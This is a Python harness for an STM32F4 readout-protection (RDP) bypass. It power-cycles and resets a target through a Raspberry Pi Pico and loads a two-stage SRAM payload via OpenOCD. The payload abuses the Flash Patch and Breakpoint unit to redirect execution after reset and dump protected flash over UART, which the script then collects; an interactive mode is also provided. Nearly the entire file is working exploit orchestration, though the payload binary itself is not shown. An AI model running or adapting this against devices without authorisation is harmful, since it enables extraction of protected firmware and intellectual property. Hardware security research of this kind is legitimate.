#!/usr/bin/env python3
"""
Test script for STM32F4 payload loading and UART monitoring via Pico.

The exploit has two stages:
1. Stage 1: Loaded via debugger, sets up FPB to redirect reset vector to SRAM
2. Stage 2: After reset, FPB redirects execution to SRAM payload which dumps flash

BOOT1 on F4 is an option bit, not a pin - only BOOT0 is controllable.
"""

import subprocess
import serial
import time
import sys
import argparse

PAYLOAD_PATH = "/home/addy/work/claude-code/raiden-pico/stm32_payloads/f4/payload.bin"
PICO_PORT = "/dev/ttyACM0"
PICO_BAUD = 115200

# Entry point for _start_stage1 (Thumb mode, +1)
PAYLOAD_ENTRY = 0x20000225


def send_pico_command(ser, cmd, wait=0.3):
    """Send command to pico and return response."""
    ser.reset_input_buffer()
    ser.write(f"{cmd}\r\n".encode())
    time.sleep(wait)
    response = ser.read(4096).decode('utf-8', errors='replace')
    return response.strip()


def load_payload_openocd():
    """Load payload to STM32F4 SRAM via OpenOCD."""
    print("[*] Loading payload via OpenOCD...")

    cmd = [
        "openocd",
        "-f", "interface/stlink.cfg",
        "-f", "target/stm32f4x.cfg",
        "-c", f"init; halt; load_image {PAYLOAD_PATH} 0x20000000; reg pc {PAYLOAD_ENTRY:#x}; resume; shutdown"
    ]

    result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)

    if "shutdown command invoked" in result.stderr:
        print("[+] Payload loaded and started")
        return True
    else:
        print("[-] Failed to load payload")
        print(result.stderr)
        return False


def reset_target_openocd():
    """Reset target via OpenOCD."""
    print("[*] Resetting target via OpenOCD...")

    cmd = [
        "openocd",
        "-f", "interface/stlink.cfg",
        "-f", "target/stm32f4x.cfg",
        "-c", "init; reset; shutdown"
    ]

    result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
    return "shutdown command invoked" in result.stderr


def run_attack_sequence(monitor_duration=10):
    """Run the STM32F4 RDP bypass attack sequence."""
    print("=" * 60)
    print("STM32F4 RDP Bypass Payload Test")
    print("=" * 60)

    try:
        ser = serial.Serial(PICO_PORT, PICO_BAUD, timeout=1)
        time.sleep(0.1)

        # Step 1: Power cycle target
        print("\n[1] Power cycle target...")
        send_pico_command(ser, "TARGET POWER OFF")
        time.sleep(0.5)
        response = send_pico_command(ser, "TARGET POWER ON", wait=1.0)
        print(f"    {response.split(chr(10))[0] if response else 'Done'}")

        ser.close()

        # Step 2: Load payload via debugger - this runs Stage 1
        print("\n[2] Load payload to SRAM via debugger...")
        time.sleep(0.5)
        if not load_payload_openocd():
            print("[-] Failed to load payload")
            return False

        # Stage 1 sets up FPB and then loops
        print("\n[3] Stage 1 running - setting up FPB...")
        time.sleep(1.0)

        # Step 3: Reset target via pico (not OpenOCD which might clear FPB)
        print("\n[4] Reset target via pico - FPB should redirect to Stage 2...")
        ser = serial.Serial(PICO_PORT, PICO_BAUD, timeout=1)
        response = send_pico_command(ser, "TARGET RESET", wait=0.5)
        print(f"    {response.split(chr(10))[0] if response else 'Done'}")
        ser.close()
        time.sleep(0.5)

        # Step 4: Monitor UART for Stage 2 output
        print(f"\n[5] Monitoring for Stage 2 output ({monitor_duration}s)...")

        ser = serial.Serial(PICO_PORT, PICO_BAUD, timeout=1)
        time.sleep(0.1)

        # Initialize pico's target UART to receive data
        # Use TARGET SEND to init UART without resetting target (SYNC would clear FPB!)
        print("    Initializing pico target UART...")
        ser.reset_input_buffer()
        ser.write(b"TARGET STM32\r\n")  # Set target type
        time.sleep(0.2)
        ser.read(1024)  # Discard response

        # Send a dummy byte to initialize UART (won't affect payload)
        ser.write(b"TARGET SEND 00\r\n")
        time.sleep(0.3)
        response = ser.read(1024).decode('utf-8', errors='replace')
        print(f"    UART init: {'OK' if 'OK' in response or 'TX' in response else response[:50]}")

        ser.reset_input_buffer()

        start_time = time.time()
        received_data = []

        while time.time() - start_time < monitor_duration:
            # Check for any pending response
            ser.write(b"TARGET RESPONSE\r\n")
            time.sleep(0.2)
            data = ser.read(4096)
            if data:
                text = data.decode('utf-8', errors='replace')
                # Filter out command echo and empty responses
                for line in text.split('\n'):
                    line = line.strip()
                    if line and not line.startswith('TARGET') and not line.startswith('>'):
                        if 'No response' not in line and 'bytes' not in line:
                            received_data.append(line)
                            print(f"    {line}")
            time.sleep(0.3)

        ser.close()

        print()
        if received_data:
            print("[+] Received data from target!")
            return True
        else:
            print("[-] No data received from target")
            print("\nTroubleshooting:")
            print("  - Check UART connection (PC10 TX -> Pico GP5 RX)")
            print("  - Verify payload UART settings match pico expectations")
            print("  - Try: TARGET SYNC then TARGET RESPONSE")
            return False

    except serial.SerialException as e:
        print(f"[-] Serial error: {e}")
        return False
    except subprocess.TimeoutExpired:
        print("[-] OpenOCD timeout")
        return False


def interactive_test():
    """Interactive mode for manual testing."""
    print("=" * 60)
    print("Interactive Payload Test")
    print("=" * 60)
    print("\nCommands: load, reset, response, quit")

    ser = serial.Serial(PICO_PORT, PICO_BAUD, timeout=1)

    while True:
        try:
            cmd = input("\n> ").strip().lower()

            if cmd == "quit" or cmd == "q":
                break
            elif cmd == "load":
                ser.close()
                load_payload_openocd()
                ser = serial.Serial(PICO_PORT, PICO_BAUD, timeout=1)
            elif cmd == "reset":
                ser.close()
                reset_target_openocd()
                ser = serial.Serial(PICO_PORT, PICO_BAUD, timeout=1)
            elif cmd == "response":
                response = send_pico_command(ser, "TARGET RESPONSE", wait=0.5)
                print(response)
            elif cmd == "sync":
                response = send_pico_command(ser, "TARGET SYNC", wait=2.0)
                print(response)
            elif cmd.startswith("pico "):
                response = send_pico_command(ser, cmd[5:], wait=0.5)
                print(response)
            else:
                print("Unknown command. Try: load, reset, response, sync, pico <cmd>, quit")

        except KeyboardInterrupt:
            break

    ser.close()
    print("\nDone.")


def main():
    parser = argparse.ArgumentParser(description="Test STM32F4 RDP bypass payload")
    parser.add_argument("--interactive", "-i", action="store_true",
                        help="Interactive mode for manual testing")
    parser.add_argument("--monitor-time", type=int, default=10,
                        help="UART monitor duration in seconds")
    args = parser.parse_args()

    if args.interactive:
        interactive_test()
    else:
        run_attack_sequence(args.monitor_time)

    print("=" * 60)
    print("Test complete")
    print("=" * 60)


if __name__ == "__main__":
    main()
